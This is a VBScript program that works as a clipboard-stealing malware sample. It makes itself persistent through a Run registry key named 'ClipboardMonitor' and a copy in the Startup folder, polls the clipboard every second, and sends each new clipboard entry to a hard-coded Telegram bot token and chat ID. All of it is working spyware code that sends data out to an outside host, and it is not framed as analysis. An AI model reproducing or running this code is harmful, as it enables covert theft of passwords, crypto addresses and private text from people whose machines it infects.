' Create objects
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Log errors to a text file
Set objErrorLog = CreateObject("Scripting.FileSystemObject").OpenTextFile("errorlog.txt", 8, True)

' Check if the script is running with administrator privileges
If Not IsAdmin() Then
    ' If not running as admin, re-run with elevated privileges
    objShell.Run "wscript.exe """ & WScript.ScriptFullName & """", 0, True
    WScript.Quit
End If

' Function to check if the script is running as administrator
Function IsAdmin()
    On Error Resume Next
    Dim objShell, objEnv
    Set objShell = CreateObject("WScript.Shell")
    Set objEnv = objShell.Environment("Process")
    
    ' Admin privileges are determined by the ability to access system folders like Program Files
    IsAdmin = (objEnv("ProgramFiles(x86)") <> "")
    On Error GoTo 0
End Function

' Add to startup registry for automatic execution on login
strRegPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ClipboardMonitor"
strScriptPath = Chr(34) & WScript.ScriptFullName & Chr(34)

On Error Resume Next
If objShell.RegRead(strRegPath) = "" Then
    objShell.RegWrite strRegPath, "wscript.exe //B " & strScriptPath, "REG_SZ"
End If
On Error GoTo 0

' Save a copy of the script in the Startup folder to ensure it starts automatically
strStartupFolder = objShell.SpecialFolders("Startup")
strDestPath = strStartupFolder & "\" & objFSO.GetFileName(WScript.ScriptFullName)
If Not objFSO.FileExists(strDestPath) Then
    objFSO.CopyFile WScript.ScriptFullName, strDestPath
End If

' Telegram Bot details
botToken = "8193387679:AAGG3-UoQqRlTnrcBt7OxUJsB-cPUu8woPc"
chatID = "7055058745"

' Function to send message to Telegram
Function SendTelegramMessage(message)
    On Error Resume Next
    Dim xmlhttp
    Set xmlhttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    xmlhttp.Open "GET", "https://api.telegram.org/bot" & botToken & "/sendMessage?chat_id=" & chatID & "&text=" & message, False
    xmlhttp.Send
    If Err.Number <> 0 Then
        objErrorLog.WriteLine Now & " - Error in SendTelegramMessage: " & Err.Description
        Err.Clear
    End If
End Function

' Function to get text from clipboard
Function GetClipboardText()
    On Error Resume Next
    Dim clipboardText, objClipboard
    Set objClipboard = CreateObject("MSForms.DataObject")
    
    ' Get the clipboard content
    objClipboard.GetFromClipboard
    clipboardText = objClipboard.GetText()
    
    If clipboardText = "" Then
        GetClipboardText = "No text found"
    Else
        GetClipboardText = clipboardText
    End If
    
    If Err.Number <> 0 Then
        objErrorLog.WriteLine Now & " - Error in GetClipboardText: " & Err.Description
        Err.Clear
    End If
End Function

' Main loop to keep script running and monitor clipboard
On Error Resume Next
Do While True
    Dim currentClipboardText, lastClipboardText
    currentClipboardText = GetClipboardText()

    ' Check if clipboard text has changed
    If currentClipboardText <> "" And currentClipboardText <> lastClipboardText Then
        lastClipboardText = currentClipboardText
        SendTelegramMessage "New clipboard text: " & currentClipboardText
    End If

    WScript.Sleep 1000 ' Check every second

    ' Error handling for the main loop
    If Err.Number <> 0 Then
        objErrorLog.WriteLine Now & " - Error in main loop: " & Err.Description
        Err.Clear
    End If
Loop
